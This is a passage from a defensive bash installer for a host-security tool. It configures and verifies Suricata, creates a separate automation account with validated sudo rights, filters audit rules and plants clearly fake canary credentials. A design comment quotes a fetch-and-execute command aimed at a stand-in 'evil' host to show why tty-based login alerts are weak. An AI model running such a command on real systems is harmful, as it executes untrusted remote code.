systemctl reload nginx 2>/dev/null || true
EOF
    ok "renewal hook installed"
}

# --- 34 -------------------------------------------------------------------
step_admin_user() {
    if "${SENTINEL_PREFIX}/bin/sentinel" web --create-admin 2>/dev/null; then
        ok "admin user created; the TOTP enrolment QR was printed above — it is shown once"
    else
        info "admin user creation arrives with the web service (P1). Run afterwards:"
        info "    sentinel web --create-admin"
    fi
}

# --- 35 -------------------------------------------------------------------
# The three files step 35 has to look at by name. Constants, so the
# verification below reads exactly the config the daemon was given and
# exactly the logs the daemon writes, rather than a second guess at any name.
SURICATA_YAML=/etc/suricata/suricata.yaml
SURICATA_EVE=/var/log/suricata/eve.json
SURICATA_STATS=/var/log/suricata/stats.log

# How long step 35 waits for the first packet to reach eve.json.
#
# Not a politeness margin. Suricata daemonises immediately and then spends
# minutes parsing the ET Open ruleset before a single capture thread starts;
# eve.json is empty for all of it. Measured on the Ubuntu 24.04.4 test host
# (suricata 7.0.3, 4 GB RAM, ~46k rules): about 2m20s from `systemctl restart`
# to the capture threads coming up. A window shorter than that reports every
# healthy install as unconfirmed, and a warning that appears on every deploy is
# a warning nobody reads by the third one.
SURICATA_CAPTURE_WAIT_S=210

# How long step 35 waits to prove stats.log has STOPPED growing.
#
# Proving a negative needs the whole window, unlike the eve.json check above,
# which can stop early the moment a byte lands. Suricata's default counters
# interval (the top-level `stats: interval:` block — untouched by this change)
# is 8s, so 20s covers two ticks with margin. An operator who raised that
# interval well past this window will not see a false "still growing" here —
# they will see a false "stopped", for one run — but the SAME check runs again
# on the next deploy, against the SAME file, so a real failure to disable it
# does not go unnoticed, only delayed by one deploy.
SURICATA_STATS_WAIT_S=20

# /proc, as a variable purely so the checks below can be exercised against a
# made-up process instead of only on a live host.
SURICATA_PROC_DIR=/proc

# The argv of the process systemd is actually tracking.
#
# NOT `systemctl show -p ExecStart`, which reports what the unit ASKS for. On a
# host where the unit was rewritten and nothing restarted, the two disagree, and
# the one that decides whether packets are captured is this one.
suricata_running_argv() {
    local pid
    pid="$(systemctl show suricata -p MainPID --value 2>/dev/null || true)"
    [[ "$pid" =~ ^[1-9][0-9]*$ ]] || return 1
    [[ -r "${SURICATA_PROC_DIR}/${pid}/cmdline" ]] || return 1
    tr '\0' ' ' < "${SURICATA_PROC_DIR}/${pid}/cmdline"
}

# The drop-in that layers Sentinel's requirements onto the packaged unit.
#
# MemoryMax goes on both families: a NIDS on a small VPS must have a ceiling, or
# a rule explosion OOM-kills whatever it was meant to protect.
#
# The EnvironmentFile/ExecStart pair goes only where the packaged unit does not
# already read OPTIONS — see suricata_unit_reads_options in distro.sh for what
# was measured on each family. `ExecStart=` on its own clears the packaged
# command; the line after it re-issues the same command with $OPTIONS appended,
# unquoted so that systemd word-splits it into arguments.
#
# The binary and the pid file are read off the unit that is installed rather
# than written down here: a pid file that disagrees with the unit's PIDFile=
# makes systemd abandon a Type=forking service that started perfectly well.
suricata_dropin_body() {
    printf '[Service]\nMemoryMax=1G\nRestart=on-failure\nRestartSec=5\n'
    suricata_unit_reads_options && return 0

    local bin pidfile
    bin="$(command -v suricata 2>/dev/null || true)"
    if [[ -z "$bin" ]]; then
        # No override rather than a broken one. An ExecStart with an empty
        # binary makes systemd refuse to start the unit at all, which is a worse
        # outcome than a daemon watching the wrong interface.
        return 1
    fi
    pidfile="$(systemctl show suricata -p PIDFile --value 2>/dev/null || true)"
    printf 'EnvironmentFile=-%s\nExecStart=\nExecStart=%s -D -c %s --pidfile %s $OPTIONS\n' \
        "$(suricata_defaults_file)" "$bin" "$SURICATA_YAML" "${pidfile:-/run/suricata.pid}"
}

# Why the running daemon has to be restarted, or nothing when it does not.
#
# `systemctl enable --now` on a service that is already up is a NO-OP, and the
# process then keeps running the PREVIOUS deployment's argv while the step
# reports success — one of the exact failures CLAUDE.md lists. So the question
# asked here is about the argv that is up, not about the unit file, and "cannot
# tell" is answered with a restart rather than with silence.
suricata_needs_restart() {
    local want="$1" argv
    if ! argv="$(suricata_running_argv)"; then
        printf 'no process is running under the unit yet'
        return 0
    fi
    [[ "$argv" == *"$want"* ]] && return 1
    printf 'its command line does not carry the options just written'
    return 0
}

# The capture interface that argv actually selects, or nothing.
#
# `--af-packet=<dev>` names it. A BARE `--af-packet` does not: it means "take
# the interface list out of suricata.yaml", and the packaged file says
# `interface: eth0` on a host whose NIC is enp0s3. Returning nothing for that
# case is the entire point of this function — it is the state step 35 used to
# print as "IDS on enp0s3" while eve.json, fast.log and stats.log were all at
# 0 bytes and the daemon was restarting every two and a half minutes.
suricata_argv_iface() {
    [[ "$1" =~ (^|[[:space:]])--af-packet=([^[:space:]]+) ]] || return 1
    printf '%s' "${BASH_REMATCH[2]}"
}

# HOME_NET as the RUNNING process resolves it.
#
# Asked of Suricata's own config parser, with the `--set` overrides recovered
# from the running argv, because the merge of yaml and command line is what
# decides whether an EXTERNAL_NET -> HOME_NET rule can ever match. Reading
# suricata.yaml directly would report the packaged RFC1918 default on a host
# where the command line overrides it, and the command line on a host where it
# does not reach the process at all.
#
# Empty output means "could not be read", which the caller reports as unknown.
suricata_effective_home_net() {
    local sets
    # `|| true` on both pipelines, not to hide failure but because failure here
    # is the "unknown" case and the caller reports it as such: an abort would
    # end the install instead of saying what could not be read.
    sets="$(grep -oE -- '--set[[:space:]]+[^[:space:]]+' <<< "$1" | tr '\n' ' ' || true)"
    # shellcheck disable=SC2086
    suricata --dump-config -c "$SURICATA_YAML" $sets 2>/dev/null \
        | awk -F' = ' '$1 == "vars.address-groups.HOME_NET" { print $2; exit }' || true
}

# Bytes in eve.json right now; 0 when it is not there yet.
suricata_eve_size() {
    stat -c %s "$SURICATA_EVE" 2>/dev/null || printf '0'
}

# Bytes in stats.log right now; 0 when it is not there.
suricata_stats_size() {
    stat -c %s "$SURICATA_STATS" 2>/dev/null || printf '0'
}

# Turns off the ONE output that writes stats.log, narrowly and idempotently.
#
# Measured on the production host, 2026-08-30: stats.log and its rotated
# copies came to roughly 120 MB/day, and nothing Sentinel ships reads it —
# `grep -rn stats.log sentinel/ deploy/ scripts/` finds three historical
# comments and no code; the collector reads eve.json. On a host with 7.6 GB of
# RAM and ~2.8 GB of page cache, that is not "just disk": it is continuous
# pressure on the exact cache a slow dashboard query already exhausted once
# (see step_configs' logrotate comment for that history).
#
# The comment above step_suricata says the distro's suricata.yaml is not ours
# to REPLACE. It does not say the file is not ours to edit narrowly, and there
# is no `--set` override for a single entry inside the `outputs:` list — that
# mechanism only reaches leaf keys like vars.address-groups.HOME_NET, not one
# item picked out of a YAML sequence. So this follows the OTHER precedent
# already on this host, `nginx_disable_default_listener`: a single, marked,
# idempotent line edit, not a rewrite.
#
# `filename: stats.log` is the anchor because it names exactly one output. A
# packaged suricata.yaml carries a SECOND, unrelated `stats:` block at the top
# level (the internal counters interval, which this does not touch) and can
# carry a THIRD, nested `- stats:` entry inside eve-log's own `types:` list
# (the periodic stats record folded into eve.json, which the task explicitly
# forbids touching) — neither of those has a `filename:` key, so neither is
# ever mistaken for this one.
#
# Returns 0 having just disabled it, 1 if it was already disabled (by an
# earlier run of this or by the operator), 2 if the file is missing, the
# anchor is not found or not unique, or the line above it is not a plain
# `enabled: yes`/`enabled: no` — any shape this was not written to recognise,
# left untouched rather than guessed at.
suricata_disable_stats_output() {
    [[ -f "$SURICATA_YAML" ]] || {
        printf 'stats.log output not checked: %s does not exist\n' "$SURICATA_YAML"
        return 2
    }

    local anchor_count anchor_line enabled_no enabled_line marker
    marker="SENTINEL-DISABLED: stats.log ran ~120MB/day and nothing reads it (deploy/install.sh step_suricata, 2026-08-30)"

    # `grep -c` always prints a count, 0 included, even on no match — so this
    # is safe under `set -e` without an `|| true`.
    anchor_count="$(grep -cE '^[[:space:]]*filename:[[:space:]]*stats\.log[[:space:]]*$' "$SURICATA_YAML")"

    if (( anchor_count == 0 )); then
        printf 'no "filename: stats.log" line in %s; nothing to disable there, or it is already gone\n' \
            "$SURICATA_YAML"
        return 2
    fi
    if (( anchor_count > 1 )); then
        printf '%d "filename: stats.log" lines in %s, expected exactly 1; not editing a file this ambiguous about which one it means\n' \
            "$anchor_count" "$SURICATA_YAML"
        return 2
    fi

    anchor_line="$(grep -nE '^[[:space:]]*filename:[[:space:]]*stats\.log[[:space:]]*$' "$SURICATA_YAML" | cut -d: -f1)"
    enabled_no=$((anchor_line - 1))
    enabled_line="$(sed -n "${enabled_no}p" "$SURICATA_YAML")"

    # Already off — ours or the operator's, either is fine, neither is edited
    # again.
    if [[ "$enabled_line" =~ ^[[:space:]]*enabled:[[:space:]]*no[[:space:]]*(#.*)?$ ]]; then
        printf 'stats.log output already disabled (line %d of %s)\n' "$enabled_no" "$SURICATA_YAML"
        return 1
    fi

    if [[ ! "$enabled_line" =~ ^[[:space:]]*enabled:[[:space:]]*yes[[:space:]]*$ ]]; then
        printf 'line %d of %s, immediately above "filename: stats.log", is %s — not a plain "enabled: yes"; leaving a shape this was not written for alone\n' \
            "$enabled_no" "$SURICATA_YAML" "${enabled_line:-<empty>}"
        return 2
    fi

    sed -i -E "${enabled_no}s|^([[:space:]]*)enabled:[[:space:]]*yes[[:space:]]*\$|\1enabled: no  # ${marker}|" \
        "$SURICATA_YAML"

    printf 'disabled stats.log output (line %d of %s was "enabled: yes"); undo: edit that line back to "enabled: yes" and restart suricata\n' \
        "$enabled_no" "$SURICATA_YAML"
    return 0
}

# Step 35's verdict, assembled out of things this host can be observed doing.
#
# Nothing here trusts `systemctl is-active`. It said `active` on the Ubuntu host
# that captured nothing: the daemon failed to open its socket, exited, and
# systemd restarted it every 2m20s, so a single is-active lands in the `active`
# phase nearly every time.
suricata_report_effect() {
    local want_iface="$1" want_ip="$2" bpf_file="$3" eve_before="$4"
    local argv iface home_net problems=()

    if ! argv="$(suricata_running_argv)"; then
        warn "suricata is installed but no process is running under its unit, so \
NOTHING is being captured. Look at:
    systemctl status suricata ; journalctl -u suricata -n 50"
        return 0
    fi

    if iface="$(suricata_argv_iface "$argv")"; then
        if ! ip -o link show "$iface" >/dev/null 2>&1; then
            problems+=("it was told to capture on ${iface}, which is not an interface on this host")
        elif [[ "$iface" != "$want_iface" ]]; then
            problems+=("it is capturing on ${iface}, not on ${want_iface} — the interface of the default route")
        fi
    else
        iface="?"
        problems+=("its command line names NO interface, so it is using the list in \
${SURICATA_YAML}; on a packaged file that is an example device, not this host's NIC")
    fi

    home_net="$(suricata_effective_home_net "$argv")"
    if [[ -z "$home_net" ]]; then
        problems+=("HOME_NET could not be read back from the effective configuration, \
so whether inbound-attack rules can match is UNKNOWN")
    elif [[ -n "$want_ip" && "$home_net" != *"$want_ip"* ]]; then
        problems+=("HOME_NET is ${home_net} and does not contain ${want_ip}; every \
EXTERNAL_NET -> HOME_NET rule — which is most of the ruleset — can never match")
    fi

    if [[ -n "$bpf_file" && "$argv" != *"-F ${bpf_file}"* ]]; then
        problems+=("the BPF exclusion file ${bpf_file} is not on its command line, so \
the dominant flow preflight told us to drop is being inspected and written to disk")
    fi

    # And then the one fact that settles it: bytes arriving in eve.json.
    # Growth, not existence — on a re-deploy the file already holds yesterday's
    # bytes, and its presence proves nothing about today.
    local waited=0 eve_now
    eve_now="$(suricata_eve_size)"
    while (( eve_now <= eve_before && waited < SURICATA_CAPTURE_WAIT_S )); do
        sleep 5
        waited=$((waited + 5))
        eve_now="$(suricata_eve_size)"
    done

    if (( ${#problems[@]} )); then
        warn "Suricata is running and is NOT watching this host correctly:
    $(printf '%s\n    ' "${problems[@]}")
    eve.json went ${eve_before} -> ${eve_now} bytes in ${waited}s.
    Its command line is: ${argv}"
    elif (( eve_now > eve_before )); then
        ok "Suricata capturing on ${iface}, HOME_NET ${home_net}, eve.json growing \
(${eve_before} -> ${eve_now} bytes in ${waited}s), MemoryMax=1G"
    else
        warn "Suricata was started with the right interface (${iface}) and HOME_NET \
(${home_net}), but eve.json did not grow in ${waited}s — capture is NOT confirmed. \
A freshly updated ruleset can still be loading. Confirm before trusting the IDS:
    ls -l ${SURICATA_EVE} ; journalctl -u suricata -n 30"
    fi
}

# The proof that stats.log stopped, as opposed to the yaml line saying it did.
#
# A rewritten `enabled: no` is a file on disk, not a daemon that read it. This
# runs every step-35, disabled or not, changed just now or already — so a
# package upgrade that quietly restores `enabled: yes` in a future conffile
# merge is caught on the very next deploy, the same way an operator's own
# revert would be, rather than only on the one run that happened to flip it.
suricata_report_stats_effect() {
    local before="$1" waited=0 after
    after="$(suricata_stats_size)"
    while (( waited < SURICATA_STATS_WAIT_S )); do
        (( after > before )) && break
        sleep 5
        waited=$((waited + 5))
        after="$(suricata_stats_size)"
    done

    if (( after > before )); then
        warn "stats.log grew ${before} -> ${after} bytes in ${waited}s AFTER being marked \
disabled — it is STILL being written, so the edit did not take effect (or something \
else re-enabled it). Check:
    systemctl status suricata ; grep -n -B1 'filename: stats.log' ${SURICATA_YAML}"
    else
        ok "stats.log stayed at ${after} bytes for ${waited}s — the output is off"
    fi
}

step_suricata() {
    if (( ! SURICATA_OK )); then
        info "Suricata skipped (RAM gate). Sentinel runs log-only."
        return 0
    fi
    pkg_install "$(suricata_pkg)" || { warn "suricata install failed; continuing log-only"; return 0; }

    # We do NOT replace the distro suricata.yaml — it is complete and passes -T.
    # Everything site-specific is layered on top via OPTIONS, a BPF file, a
    # drop-in and an ACL, so an upgrade of the package never clobbers our config.
    local iface bpf bpf_file pubip options
    iface="$(ip route show default 2>/dev/null | awk '/default/{print $5; exit}')"
    iface="${iface:-eth0}"
    pubip="$(public_ips 2>/dev/null | head -1)"

    # Inspecting a high-volume, low-value flow is the fastest way to fill the
    # disk. Preflight flags the dominant one; exclude it in the kernel BPF so
    # Suricata never even sees those packets.
    bpf=""
    bpf_file=""
    [[ -n "${BPF_HINT:-}" ]] && bpf="not host ${BPF_HINT}"
    options="--af-packet=${iface}"
    if [[ -n "${bpf}" ]]; then
        bpf_file=/etc/suricata/capture-filter.bpf
        printf '%s\n' "${bpf}" > "$bpf_file"
        options+=" -F ${bpf_file}"
        info "Suricata BPF excludes: ${bpf}"
    fi
    # HOME_NET must include this host's public address or inbound-attack rules
    # (EXTERNAL_NET -> HOME_NET) never match. The distro default is RFC1918 only.
    [[ -n "${pubip}" ]] && options+=" --set vars.address-groups.HOME_NET=[${pubip}]"

    printf 'OPTIONS="%s"\n' "${options}" > "$(suricata_defaults_file)"

    # -- and then make sure the unit actually READS that file ------------------
    local dropin=/etc/systemd/system/suricata.service.d/sentinel.conf
    local dropin_body
    dropin_body="$(suricata_dropin_body)" || \
        warn "suricata is not on PATH, so the unit cannot be handed ${options}; the \
daemon will capture on whatever ${SURICATA_YAML} names, which is not this host's NIC."
    install -d -m 0755 /etc/systemd/system/suricata.service.d
    printf '%s\n' "$dropin_body" > "$dropin"
    systemctl daemon-reload

    # The unprivileged ingest daemon reads eve.json. A per-user ACL grants
    # exactly read, and a default ACL keeps it working across logrotate.
    install -d -m 0750 /var/log/suricata
    if have setfacl; then
        setfacl -R -m u:"${SENTINEL_USER}":rX /var/log/suricata 2>/dev/null || true
        setfacl -R -d -m u:"${SENTINEL_USER}":rX /var/log/suricata 2>/dev/null || true
    fi

    # stats.log: an output nobody reads, at ~120 MB/day on the production
    # host. This runs BEFORE the -T test below on purpose — a broken edit
    # fails there, exactly like a broken OPTIONS or drop-in already does,
    # rather than being caught nowhere.
    local stats_status=0 stats_msg
    stats_msg="$(suricata_disable_stats_output)" || stats_status=$?
    case $stats_status in
        0) ok "$stats_msg" ;;
        1) info "$stats_msg" ;;
        *) warn "$stats_msg" ;;
    esac

    suricata-update >/dev/null 2>&1 || warn "suricata-update failed; using shipped rules"
    # A rejected configuration stops the IDS work here and NOTHING else.
    #
    # This was a `die`, which was survivable while step 35 ran once on a fresh
    # install. It is in ALWAYS_STEPS now, so it runs on every deploy — and a
    # `die` would abort the run before step 37 installs the audit rules, before
    # the smoke test, and before step 40 tells the operator anything at all. One
    # bad ruleset would take the whole deployment down with it.
    #
    # The daemon is deliberately NOT restarted on this path either: what is
    # running now started from a configuration that passed, and replacing it with
    # one that has just failed turns a warning into an outage.
    # shellcheck disable=SC2086
    if ! suricata -T -c "$SURICATA_YAML" ${options}; then
        warn "'suricata -T' rejected this configuration, so the daemon was NOT \
restarted and is still running whatever it started with. $(suricata_defaults_file) and \
the systemd drop-in have ALREADY been rewritten with the options that failed the test, \
so a reboot would start suricata with them. The error is printed above. Fix it and \
re-run this step:  --force-step 35"
        return 0
    fi

    systemctl enable suricata >/dev/null 2>&1 || true
    local restart_reason=""
    restart_reason="$(suricata_needs_restart "$options")" || restart_reason=""

    # Disabling an output is a change to the config the running process
    # already parsed at startup — SIGHUP only makes Suricata reopen files it
    # already has open for rotation, it does not re-read the outputs list, so
    # the daemon would otherwise keep writing stats.log under the OLD config
    # for however long it happened to run next.
    if [[ -z "$restart_reason" && $stats_status -eq 0 ]]; then
        restart_reason="stats.log output was just disabled in ${SURICATA_YAML}, and only a full restart re-reads the outputs list"
    fi

    if [[ -n "$restart_reason" ]]; then
        info "restarting suricata: ${restart_reason}"
        systemctl restart suricata || warn "systemctl restart suricata returned non-zero"
    else
        info "suricata already runs with these options; not restarting it"
    fi

    local eve_before; eve_before="$(suricata_eve_size)"
    suricata_report_effect "$iface" "$pubip" "$bpf_file" "$eve_before"

    local stats_before; stats_before="$(suricata_stats_size)"
    suricata_report_stats_effect "$stats_before"
}

# --- 36 -------------------------------------------------------------------
# The account automation logs in as, kept apart from yours.
#
# ## Why this exists
#
# The login-history feature alerts on every INTERACTIVE session — one with a
# terminal — and stays quiet for sessions without one. That works today only
# because every automation on this host happens to run `ssh host "command"`,
# which allocates no tty. It is a proxy, not a boundary: anyone holding the key
# can run `ssh host "curl evil | sh"` and get the same silence.
#
# Measured on 24 August 2026, the host had exactly ONE authorised key, and both
# the operator and the deploy scripts used it. There was nothing to tell them
# apart — not the key fingerprint, not the source address, not the account.
#
# With a separate account, "no terminal" stops being the discriminator and
# IDENTITY takes over: a session on the deploy account is automation, and a
# session without a terminal on the OPERATOR account becomes a surprise again.
#
# ## What this step does NOT do
#
# It does not create a key. The private half must never exist on this host, and
# never passes through this script: the operator generates it on their own
# machine and installs only the public half. A deploy key generated by the thing
# being deployed to is a key the host has seen.
#
# It also does not switch the deploy scripts over. The account is created and
# left ready; `scripts/deploy.sh --user` is the operator's to change, once they
# have confirmed they can log in with it. A step that flipped both at once would
# make the first failure a lockout.
DEPLOY_ACCOUNT="${DEPLOY_ACCOUNT:-sentinel-deploy}"

step_deploy_account() {
    if ! id -u "$DEPLOY_ACCOUNT" >/dev/null 2>&1; then
        # `--system` deliberately NOT used: a system account gets a uid below
        # 1000, and every audit rule on this host filters on `auid>=1000` or
        # `auid!=unset`. A system account would be invisible to exactly the
        # history this account exists to be distinguishable in.
        useradd --create-home --shell /bin/bash \
                --comment "Sentinel automation (deploys, diagnostics)" \
                "$DEPLOY_ACCOUNT"
        ok "created ${DEPLOY_ACCOUNT}"
    else
        ok "${DEPLOY_ACCOUNT} already exists"
    fi

    install -d -m 0700 -o "$DEPLOY_ACCOUNT" -g "$DEPLOY_ACCOUNT" \
            "/home/${DEPLOY_ACCOUNT}/.ssh"
    touch "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"
    chown "${DEPLOY_ACCOUNT}:${DEPLOY_ACCOUNT}" "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"
    chmod 0600 "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"

    # sudo without a password, because a deploy runs unattended and a prompt it
    # cannot answer is a deploy that hangs until it times out. Scoped to ALL
    # rather than a command list, and that is a deliberate, stated choice: the
    # installer runs dnf, systemctl, nft, useradd, install, tee and more, and a
    # list that drifts out of date fails a deploy halfway through — which is the
    # single most dangerous moment to fail.
    #
    # What makes this survivable is that the account is now VISIBLE: every
    # command it runs lands in `session_commands` with its arguments, forever.
    # The trade is "unrestricted but fully recorded" over "restricted, drifting,
    # and recorded" — and the second only looks safer.
    # The filename carries a numeric prefix and the word "account", and BOTH
    # halves are scar tissue from 25 August 2026.
    #
    # The first version wrote `/etc/sudoers.d/sentinel-deploy` — the obvious
    # name, and the same one the operator had already used by hand for their own
    # NOPASSWD rule, because `docs/CHANGELOG.md` 0.6.0 says a deploy from Windows
    # needs one. The step overwrote it. Nothing failed, nothing warned: the file
    # validated, the step reported success, and the operator's passwordless sudo
    # was simply gone until the next time they tried to use it.
    #
    # So: a name this step owns, and a REFUSAL to touch anything else.
    local sudoers=/etc/sudoers.d/60-sentinel-deploy-account
    local marker="# managed by sentinel install.sh step_deploy_account"

    # Never clobber a file we did not write. A hand-made rule with our name on it
    # is somebody's access, and losing it is exactly the failure above.
    if [[ -e "$sudoers" ]] && ! grep -qF "$marker" "$sudoers"; then
        warn "${sudoers} exists and was not written by this step — leaving it alone."
        warn "Nothing was changed. If it should hold the automation rule, move it aside first."
        return 0
    fi

    printf '%s\n%s ALL=(ALL) NOPASSWD: ALL\n' "$marker" "$DEPLOY_ACCOUNT" > "$sudoers"
    chmod 0440 "$sudoers"
    # Not `visudo -c` on the whole tree — on the FILE. A syntax error anywhere in
    # sudoers.d makes sudo refuse everything for everyone, including the operator
    # recovering from it. Checked before it can take effect.
    if ! visudo -cf "$sudoers" >/dev/null; then
        rm -f "$sudoers"
        die "the sudoers fragment for ${DEPLOY_ACCOUNT} did not validate; removed"
    fi
    ok "sudo rule for ${DEPLOY_ACCOUNT} installed and validated"

    # The wreckage of the first version, if this host ran it. That file used to
    # hold the OPERATOR's rule on hosts where they had written one; now it holds
    # only ours, and the operator's passwordless sudo is gone without a word.
    #
    # Detected rather than repaired: we do not know what their rule said, and
    # writing a guess into sudoers is worse than saying what happened.
    local clobbered=/etc/sudoers.d/sentinel-deploy
    if [[ -f "$clobbered" ]] \
       && grep -q "^${DEPLOY_ACCOUNT} ALL=" "$clobbered" \
       && [[ "$(wc -l < "$clobbered")" -le 2 ]]; then
        warn "${clobbered} contains ONLY the automation rule."
        warn "An earlier version of this step wrote that file, and on hosts where"
        warn "you kept your own NOPASSWD rule there, it was overwritten — which is"
        warn "why sudo may now ask you for a password. Restore yours with:"
        warn "    echo '<your-user> ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/50-operator"
        warn "    sudo chmod 0440 /etc/sudoers.d/50-operator && sudo visudo -c"
        warn "Then remove the stale file: sudo rm -f ${clobbered}"
    fi

    # The effect, not the intent. An account with no key cannot log in, and
    # saying "created" about it would be the same class of lie this whole
    # repository keeps tripping over.
    if [[ ! -s "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys" ]]; then
        warn "${DEPLOY_ACCOUNT} has NO authorised key yet, so it cannot log in."
        warn "Generate one on YOUR machine (the private half must never reach this host):"
        warn "    ssh-keygen -t ed25519 -f ~/.ssh/sentinel_deploy -C sentinel-deploy"
        warn "Then install the public half:"
        warn "    ssh-copy-id -i ~/.ssh/sentinel_deploy.pub ${DEPLOY_ACCOUNT}@<host>"
        warn "Then switch the deploy scripts over:"
        warn "    scripts/deploy.sh --user ${DEPLOY_ACCOUNT} --key ~/.ssh/sentinel_deploy …"
    else
        local keys
        keys="$(grep -c '^ssh-' "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys" || true)"
        ok "${DEPLOY_ACCOUNT} has ${keys} authorised key(s)"
    fi
}

# One line of a rules file -> the identity that survives a round trip through
# the kernel.
#
# Comparing rule TEXT is not possible, and that is why the previous version of
# this compared keys instead. Measured on Ubuntu 24.04.4, `auditctl -l` hands
# back what it was given, rewritten:
#
#   -F a1&07000                              as   -F a1&0xE00
#   -F auid!=unset                           as   -F auid!=-1
#   -S init_module,finit_module,delete_module     reordered
#   a watch's key as  -k <key>  ,  a syscall rule's key as  -F key=<key>
#
# So each rule is identified by the one field that comes back intact: a watch by
# its path, a keyed rule by its key, a suppression by its directory. A line that
# matches none of those is reported as unchecked rather than counted as present
# — "I cannot check this" and "this is loaded" are different answers, and only
# one of them is true.
audit_rule_signatures() {
    awk '
        /^[[:space:]]*#/ { next }
        /^[[:space:]]*$/ { next }
        /^-w[[:space:]]/                  { print "watch " $2; next }
        match($0, /-F key=[^ ]+/)         { print "key " substr($0, RSTART + 7, RLENGTH - 7); next }
        match($0, /(^| )-k +[^ ]+/)       { s = substr($0, RSTART, RLENGTH)
                                            sub(/^ ?-k +/, "", s)
                                            print "key " s; next }
        match($0, /-F dir=[^ ]+/)         { print "dir " substr($0, RSTART + 7, RLENGTH - 7); next }
        /^-b[[:space:]]/                  { print "option -b " $2; next }
        /^--backlog_wait_time[[:space:]]/ { print "option --backlog_wait_time " $2; next }
        { print "unchecked " $0 }
    '
}

# The rules THIS host can load, and the lines whose path does not resolve.
#
# MEASURED on the Ubuntu 24.04.4 VM (192.0.2.134) on 26 August 2026, before any
# of this was written:
#
#   * `-a never,exit -F dir=/nonexistent` is REFUSED by the kernel with
#     "Error sending add rule data request (No such file or directory)". The path
#     has to resolve AT LOAD TIME. It does not even have to be a directory —
#     `-F dir=/etc/passwd` loads.
#   * `auditctl -R`, which is what `augenrules --load` runs, STOPS at the first
#     refused line; everything after it is never offered to the kernel. With
#     /var/lib/docker absent, 27 of the 30 shipped rules were loaded, and the two
#     suppressions that FOLLOW it — /opt/sentinel and /var/lib/sentinel — were
#     among the three lost, so Sentinel audited its own writes. That is the exact
#     noise those lines exist to remove. Measured again with an empty
#     /var/lib/docker created by hand: all 30 loaded.
#   * a loaded `-F dir=` rule DISAPPEARS from `auditctl -l` the moment the
#     directory is removed, and does not come back when it is recreated. That is
#     why this filters rather than creating the directory: a /var/lib/docker we
#     invented would be a claim that docker is here, and would still be one
#     `rmdir` away from silently dropping the suppression.
#
# `-w /nonexistent -p wa -k x` was believed, on the strength of the Ubuntu
# measurement above, to load FINE -- and for a day this function filtered ONLY
# `-F dir=`, on that belief. MEASURED on the AlmaLinux 9.8 production host (5.14
# kernel, auditctl 3.1.5, 30 August 2026): `-w /nu/exista -p wa -k proba` and
# `-w /nu/exista -p r -k proba` are BOTH refused, byte for byte the same error
# as `-F dir=`. The behaviour is not one fact about the kernel, it is two facts
# about two different kernels, and a comment that states a measurement from one
# platform as a rule for all of them is exactly the pattern CLAUDE.md warns
# about. Here it nearly cost the command-history rule and both `never,exit`
# suppressions: functionality 05 plants two bait files before this function ever
# runs, so a normal deploy never hit this. The moment either bait file is
# missing when `augenrules --load` next runs -- an operator deleting a file they
# do not recognise, a repointed `CANARY_*_PATH` whose plant failed, any reboot
# after either -- `auditctl -R` would stop there and silently drop
# `sentinel_cmd` and both suppressions with it. So `-w` is filtered exactly like
# `-F dir=` now, for the same reason and with the same fix: existence is checked
# before offering the line to the kernel, not assumed from what one platform
# happened to do.
#
# So a `-w` or `-F dir=` rule whose path is absent is left OUT of the file that
# goes to /etc/audit/rules.d, and the caller NAMES it. Everything else passes
# through byte for byte: on a host where every path is present — every RHEL
# host in production, which has docker and both baits planted — the installed
# file is identical to the shipped one, and so is what the kernel ends up
# holding.
#
# Writes the kept rules to $1; prints the dropped lines on stdout.
audit_rules_for_this_host() {
    local dest="$1" line target
    : > "$dest"
    while IFS= read -r line || [[ -n "$line" ]]; do
        target=""
        if [[ "$line" =~ ^[[:space:]]*-[aA][[:space:]] ]] &&
           [[ "$line" =~ -F[[:space:]]+dir=([^[:space:]]+) ]]; then
            target="${BASH_REMATCH[1]}"
        elif [[ "$line" =~ ^[[:space:]]*-w[[:space:]]+([^[:space:]]+) ]]; then
            target="${BASH_REMATCH[1]}"
        fi
        if [[ -n "$target" ]] && [[ ! -e "$target" ]]; then
            printf '%s\n' "$line"
            continue
        fi
        printf '%s\n' "$line" >> "$dest"
    done
}

# Functionality 05: the two bait files the sentinel_bait rule below watches.
#
# Fixed marker, embedded in everything this installer writes. It used to be
# what a repeat deploy READ to tell "ours" from "something real already
# occupies this path" — `grep -qF "sentinel-canary" "$path"` opened the bait
# and read its content. That is gone (see install_canary_baits): opening the
# bait's content is the one action the sentinel_bait rule exists to catch, and
# once that rule is armed — true of every deploy after the first — the
# installer's own grep is indistinguishable, to the kernel, from an
# attacker's. MEASURED on production: incident 65237, 31 August 2026, a
# `critical` "bait read" raised by the installer against itself, on every
# single delivery. Classification now goes by size, from `stat`, against what
# was recorded when the bait was planted; the marker stays in the content
# anyway, because it is still what tells a human — the operator staring at a
# dump, or an attacker who already read the file — that it was worthless on
# purpose.
#
# Kept LOCAL to the function rather than a module-level constant: a test that
# extracts only this function's body (the pattern the rest of this file's
# tests use) must not depend on a global assignment living outside it.
#
# The two contents. Neither looks like a real secret (no key- or hash-shaped
# string): the whole point of a bait is that its content is worthless, so
# whoever reads it — attacker or, years later, the operator staring at a dump —
# cannot mistake it for something that still needs rotating.
_canary_content() {
    local marker="# sentinel-canary: fake content, planted on purpose -- not a real credential"
    case "$1" in
        "$CANARY_PGPASS_PATH")
            cat <<EOF
${marker}
# format: hostname:port:database:username:password
127.0.0.1:5432:*:svc_backup:not-a-real-password
EOF
            ;;
        "$CANARY_AWS_CREDS_PATH")
            cat <<EOF
${marker}
[default]
aws_access_key_id = not-a-real-access-key
aws_secret_access_key = not-a-real-secret-key
EOF
            ;;
        *) return 1 ;;
    esac
}

# Plants whichever baits are missing; never rewrites one that is already
# there, for either reason below. `-w` requires the watched path to EXIST at
# load time (same constraint as `-F dir=` above, and the same failure mode:
# `auditctl -R` refuses a rule for a path that is not there), so this has to
# run and finish before install_audit_rules stages anything — a bait created
# after the rules load is a rule silently missing from the kernel.
#
# A bait already present is classified by comparing SIZE, from `stat`, never
# by opening the file. `stat()` is a pure metadata call: it is not a read, a
# write, an execute nor an attribute change, so `-p r` on the sentinel_bait
# rule cannot see it — see the comment on that rule in
